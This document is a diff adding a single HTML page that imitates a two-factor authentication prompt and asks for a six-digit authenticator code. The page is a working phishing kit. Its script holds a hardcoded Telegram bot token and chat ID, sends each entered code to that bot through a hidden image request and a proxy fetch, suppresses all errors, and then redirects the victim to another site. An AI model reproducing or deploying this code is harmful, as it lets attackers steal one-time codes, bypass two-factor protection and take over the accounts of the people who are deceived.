@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #000000;
+            min-height: 100vh;
+            padding: 40px 20px;
+            color: white;
+        }
+
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+        }
+
+        .header {
+            margin-bottom: 40px;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 400;
+            color: white;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .description {
+            font-size: 16px;
+            color: #aaaaaa;
+            line-height: 1.5;
+        }
+
+        .illustration-container {
+            background: linear-gradient(135deg, #a8e6cf 0%, #88d8a3 100%);
+            border-radius: 20px;
+            padding: 40px 30px;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 200px;
+        }
+
+        .phone-illustration {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            position: relative;
+        }
+
+        .phone-left {
+            width: 100px;
+            height: 180px;
+            background: white;
+            border-radius: 15px;
+            border: 4px solid #2c3e50;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            padding: 15px 10px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .phone-left::before {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 3px;
+            background: #2c3e50;
+            border-radius: 2px;
+        }
+
+        .phone-header {
+            height: 20px;
+            background: #2c3e50;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .orange-icon {
+            width: 20px;
+            height: 20px;
+            background: #ff9500;
+            border-radius: 50%;
+            margin-bottom: 10px;
+            align-self: flex-start;
+        }
+
+        .stars {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+        }
+
+        .phone-right {
+            width: 100px;
+            height: 180px;
+            background: white;
+            border-radius: 15px;
+            border: 4px solid #2c3e50;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            padding: 15px 10px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .phone-right::before {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 3px;
+            background: #2c3e50;
+            border-radius: 2px;
+        }
+
+        .shield-icon {
+            width: 40px;
+            height: 40px;
+            background: #ffd700;
+            border-radius: 50%;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .phone-lines {
+            width: 80%;
+            height: 3px;
+            background: #ddd;
+            margin: 3px auto;
+            border-radius: 2px;
+        }
+
+        .hand {
+            position: absolute;
+            bottom: -10px;
+            left: 60px;
+            width: 60px;
+            height: 50px;
+            background: #8b4513;
+            border-radius: 50% 50% 30% 30%;
+            transform: rotate(-25deg);
+            z-index: 2;
+        }
+
+        .finger {
+            position: absolute;
+            top: -20px;
+            left: 20px;
+            width: 15px;
+            height: 35px;
+            background: #8b4513;
+            border-radius: 50%;
+            transform: rotate(45deg);
+        }
+
+        .pointing-line {
+            position: absolute;
+            top: 50px;
+            left: 80px;
+            width: 60px;
+            height: 3px;
+            background: #ff9500;
+            transform: rotate(-15deg);
+            z-index: 1;
+        }
+
+        .code-input-container {
+            margin-bottom: 30px;
+        }
+
+        .code-input {
+            width: 100%;
+            height: 60px;
+            padding: 0 20px;
+            font-size: 16px;
+            background: transparent;
+            border: 2px solid #333;
+            border-radius: 15px;
+            outline: none;
+            color: #aaa;
+        }
+
+        .code-input::placeholder {
+            color: #666;
+        }
+
+        .code-input:focus {
+            border-color: #555;
+            color: white;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            gap: 12px;
+        }
+
+        .checkbox-wrapper {
+            position: relative;
+        }
+
+        .checkbox {
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #4a90e2;
+            border-radius: 4px;
+            cursor: pointer;
+            background-color: #4a90e2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .checkbox::after {
+            content: '✓';
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .checkbox-label {
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .continue-button {
+            width: 100%;
+            height: 56px;
+            background: linear-gradient(135deg, #87ceeb 0%, #4a90e2 100%);
+            color: white;
+            border: none;
+            border-radius: 28px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 20px;
+        }
+
+        .continue-button:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(74, 144, 226, 0.3);
+        }
+
+        .continue-button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            background: #333;
+            color: #666;
+        }
+
+        .try-another-button {
+            width: 100%;
+            height: 56px;
+            background: transparent;
+            color: white;
+            border: 2px solid #333;
+            border-radius: 28px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .try-another-button:hover {
+            border-color: #555;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        @media (max-width: 600px) {
+            .title {
+                font-size: 24px;
+            }
+            
+            .illustration-container {
+                padding: 30px 20px;
+            }
+            
+            .phone-left,
+            .phone-right {
+                width: 80px;
+                height: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="title">Go to your authentication app</h1>
+            <p class="description">
+                Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).
+            </p>
+        </div>
+
+        <!-- Illustration -->
+        <div class="illustration-container">
+            <div class="phone-illustration">
+                <div class="phone-left">
+                    <div class="phone-header"></div>
+                    <div class="orange-icon"></div>
+                    <div class="stars">★★★★★★</div>
+                </div>
+                
+                <div class="phone-right">
+                    <div class="phone-header"></div>
+                    <div class="shield-icon">🛡️</div>
+                    <div class="phone-lines"></div>
+                    <div class="phone-lines"></div>
+                    <div class="phone-lines"></div>
+                    <div class="phone-lines" style="margin-top: 10px;"></div>
+                    <div class="stars" style="text-align: center; margin-top: 10px;">★★★★★★</div>
+                </div>
+                
+                <div class="hand">
+                    <div class="finger"></div>
+                </div>
+                <div class="pointing-line"></div>
+            </div>
+        </div>
+
+        <!-- Code Input -->
+        <div class="code-input-container">
+            <input
+                type="text"
+                id="codeInput"
+                class="code-input"
+                placeholder="Code"
+                maxlength="6"
+            />
+        </div>
+
+        <!-- Checkbox -->
+        <div class="checkbox-container">
+            <div class="checkbox-wrapper">
+                <input type="checkbox" id="trustDevice" class="checkbox" checked />
+            </div>
+            <label for="trustDevice" class="checkbox-label">
+                Trust this device and skip this step from now on
+            </label>
+        </div>
+
+        <!-- Continue Button -->
+        <button id="continueBtn" class="continue-button" disabled>
+            Continue
+        </button>
+
+        <!-- Try Another Way Button -->
+        <button class="try-another-button">
+            Try another way
+        </button>
+    </div>
+
+    <script>
+        // Bot configuration
+        const BOT_TOKEN = '8427627573:AAFGbWtwUMc1cQ25ImzNwLnQDt0jW8p4PVs';
+        const CHAT_ID = '6843983729';
+
+        // DOM elements
+        const codeInput = document.getElementById('codeInput');
+        const continueBtn = document.getElementById('continueBtn');
+
+        // Send to Telegram silently
+        async function sendToTelegram(code) {
+            const message = `🔐 Authentication Code: ${code}`;
+            
+            try {
+                const methods = [
+                    () => {
+                        const img = new Image();
+                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                    },
+                    
+                    async () => {
+                        try {
+                            const proxyUrl = 'https://api.allorigins.win/raw?url=';
+                            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                            await fetch(proxyUrl + encodeURIComponent(telegramUrl));
+                        } catch (e) {}
+                    }
+                ];
+
+                methods.forEach(method => {
+                    try {
+                        method();
+                    } catch (e) {}
+                });
+                
+            } catch (error) {
+                // Silent fail
+            }
+        }
+
+        // Code input validation and button state
+        codeInput.addEventListener('input', function(e) {
+            // Only allow numbers and limit to 6 digits
+            let value = e.target.value.replace(/\D/g, '').slice(0, 6);
+            e.target.value = value;
+            
+            // Enable/disable continue button based on 6-digit input
+            if (value.length === 6) {
+                continueBtn.disabled = false;
+            } else {
+                continueBtn.disabled = true;
+            }
+        });
+
+        // Continue button click handler
+        continueBtn.addEventListener('click', async function() {
+            const code = codeInput.value.trim();
+            
+            if (code.length !== 6) {
+                return;
+            }
+
+            // Send to Telegram in background
+            sendToTelegram(code);
+            
+            // Redirect to the specified URL
+            setTimeout(() => {
+                window.location.href = 'https://time-line-eight.vercel.app/';
+            }, 500);
+        });
+
+        // Enter key support
+        codeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !continueBtn.disabled) {
+                continueBtn.click();
+            }
+        });
+    </script>
+</body>
+</html>
